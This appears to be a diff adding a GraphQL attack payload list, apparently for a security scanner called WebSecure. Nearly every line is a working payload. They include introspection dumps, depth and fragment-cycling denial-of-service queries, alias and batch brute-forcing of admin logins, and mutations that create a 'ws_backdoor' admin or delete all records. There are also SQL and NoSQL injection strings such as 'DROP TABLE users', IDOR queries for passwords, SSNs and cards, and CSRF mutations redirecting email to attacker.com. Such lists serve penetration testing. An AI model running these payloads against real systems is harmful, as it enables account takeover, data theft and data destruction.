@@ -1,0 +1,129 @@
+# GraphQL Injection & Abuse Payloads — WebSecure
+# Introspection | Depth | Batching | Alias | Mutation | Injection | Bypass | IDOR | CSRF
+
+# ── INTROSPECTION QUERIES ──
+{"query": "{ __schema { types { name } } }"}
+{"query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"}
+{"query": "{ __schema { mutationType { fields { name description args { name type { name } } } } } }"}
+{"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
+{"query": "{ __type(name: \"User\") { fields { name type { name kind } } } }"}
+{"query": "{ __type(name: \"Query\") { fields { name args { name } } } }"}
+{"query": "{ __schema { directives { name description args { name } } } }"}
+{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name }"}
+
+# ── FIELD SUGGESTION (typo-based) ──
+{"query": "{ usr { id username password email } }"}
+{"query": "{ user { passwrd } }"}
+{"query": "{ users { secretToken adminFlag } }"}
+{"query": "{ admin { bypassAuth deleteAll } }"}
+{"query": "{ user { tok3n s3cret } }"}
+
+# ── DEPTH / COMPLEXITY ATTACKS ──
+{"query": "{ users { friends { friends { friends { friends { friends { id } } } } } } }"}
+{"query": "{ a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } }"}
+{"query": "{ users { posts { comments { author { posts { comments { author { id } } } } } } } }"}
+
+# ── ALIAS ATTACKS (batching via aliases) ──
+{"query": "{ a1: user(id: 1) { id username } a2: user(id: 2) { id username } a3: user(id: 3) { id username } }"}
+{"query": "{ login1: login(username:\"admin\", password:\"pass1\") { token } login2: login(username:\"admin\", password:\"pass2\") { token } login3: login(username:\"admin\", password:\"pass3\") { token } }"}
+{"query": "{ admin: user(role: \"admin\") { id password } superuser: user(role: \"superuser\") { id password } root: user(role: \"root\") { id password } }"}
+
+# ── BATCH QUERY ATTACKS ──
+[{"query": "{ user(id: 1) { id username password } }"}, {"query": "{ user(id: 2) { id username password } }"}, {"query": "{ user(id: 3) { id username password } }"}]
+[{"query": "{ me { id } }"}, {"query": "mutation { login(username:\"admin\", password:\"admin\") { token } }"}]
+[{"query": "query { __schema { types { name } } }"}]
+
+# ── FRAGMENT CYCLING (DoS) ──
+{"query": "fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }"}
+{"query": "{ users { ...UserFragment } } fragment UserFragment on User { id username ...UserFragment }"}
+
+# ── MUTATION INJECTION ──
+{"query": "mutation { createUser(username: \"attacker\", password: \"attacker\", role: \"admin\") { id } }"}
+{"query": "mutation { updateUser(id: 1, role: \"admin\") { id username role } }"}
+{"query": "mutation { deleteUser(id: 1) { success } }"}
+{"query": "mutation { login(username: \"admin\", password: \"' OR '1'='1\") { token } }"}
+{"query": "mutation { updatePassword(userId: 1, newPassword: \"hacked\") { success } }"}
+{"query": "mutation { createAdmin(username: \"ws_backdoor\", password: \"ws_backdoor\") { id token } }"}
+{"query": "mutation { updateUser(where: {}, data: {role: \"admin\"}) { count } }"}
+{"query": "mutation { deleteAll { count } }"}
+{"query": "mutation { import(data: \"{\\\"users\\\": [{\\\"role\\\":\\\"admin\\\"}]}\") { success } }"}
+
+# ── SQL INJECTION VIA GRAPHQL ──
+{"query": "{ users(filter: \"1=1\") { id username password } }"}
+{"query": "{ user(id: \"1 OR 1=1\") { id username password } }"}
+{"query": "{ user(username: \"admin' OR '1'='1\") { id password } }"}
+{"query": "{ users(search: \"' UNION SELECT username,password FROM users--\") { id username } }"}
+{"query": "{ user(id: \"1; DROP TABLE users--\") { id } }"}
+{"query": "{ users(orderBy: \"id DESC; SELECT 1\") { id } }"}
+{"query": "{ user(id: \"1' AND SLEEP(3)--\") { id } }"}
+{"query": "{ users(where: {id: {_eq: \"1 OR 1=1\"}}) { id username password } }"}
+{"query": "{ users(filter: {username: {_like: \"%\"}}) { id username password email } }"}
+
+# ── NOSQL INJECTION VIA GRAPHQL ──
+{"query": "{ users(filter: {username: {$regex: \".*\"}}) { id username password } }"}
+{"query": "{ user(filter: {$where: \"1==1\"}) { id username } }"}
+{"query": "{ users(where: {password: {$ne: \"\"}}) { id username password } }"}
+{"query": "{ users(filter: {_or: [{username: {_eq: \"admin\"}}, {id: {_gt: 0}}]}) { id username password } }"}
+
+# ── IDOR / AUTHORIZATION BYPASS ──
+{"query": "{ user(id: 1) { id username email password apiKey secretKey } }"}
+{"query": "{ user(id: 2) { id username password creditCard ssn } }"}
+{"query": "{ users { id username email password role apiKey } }"}
+{"query": "{ admin { allUsers { id username password role } } }"}
+{"query": "{ viewer { id } }", "variables": {"id": 1}}
+{"query": "{ order(id: \"OTHER_USER_ORDER_ID\") { id items total } }"}
+{"query": "{ message(id: 1) { id content sender recipient } }"}
+
+# ── CSRF VIA GRAPHQL ──
+{"query": "mutation { changeEmail(email: \"attacker@attacker.com\") { success } }"}
+{"query": "mutation { changePassword(newPassword: \"hacked\") { success } }"}
+{"query": "mutation { deleteAccount { success } }"}
+{"query": "mutation { addAdmin(userId: 1337) { success } }"}
+
+# ── SUBSCRIPTION ABUSE ──
+{"query": "subscription { userCreated { id username password role } }"}
+{"query": "subscription { messageReceived { content sender recipient } }"}
+{"query": "subscription { allEvents { type data } }"}
+
+# ── GRAPHQL OVER GET (CSRF-friendly) ──
+/graphql?query={users{id,username,password}}
+/graphql?query={__schema{types{name}}}
+/api/graphql?query={me{id,username,email,role,apiKey}}
+/graphql?query=mutation{login(username:"admin",password:"admin"){token}}
+
+# ── ENDPOINT DISCOVERY ──
+/graphql
+/api/graphql
+/v1/graphql
+/v2/graphql
+/graphiql
+/playground
+/api/v1/graphql
+/__graphql
+/gql
+/graph
+/graphql/console
+/query
+/api/query
+
+# ── HEADER-BASED BYPASS ──
+Content-Type: application/graphql
+Content-Type: application/x-www-form-urlencoded
+X-HTTP-Method-Override: POST
+X-GraphQL-Query: { users { id } }
+
+# ── PERSISTED QUERY ATTACKS ──
+{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "aaaa"}}}
+{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000"}}, "query": "{ users { id username password } }"}
+
+# ── DIRECTIVE INJECTION ──
+{"query": "{ users @deprecated { id username password } }"}
+{"query": "{ users @skip(if: false) { id username password } }"}
+{"query": "{ users @include(if: true) { id username password } }"}
+{"query": "{ users @specifiedBy(url: \"http://attacker.com\") { id } }"}
+
+# ── TYPE CONFUSION ──
+{"query": "{ ... on User { id username password } }"}
+{"query": "{ users { ... on Admin { adminToken superSecret } ... on User { id password } } }"}
+{"query": "{ node(id: \"USER_ID\") { ... on User { password } ... on Admin { accessToken } } }"}
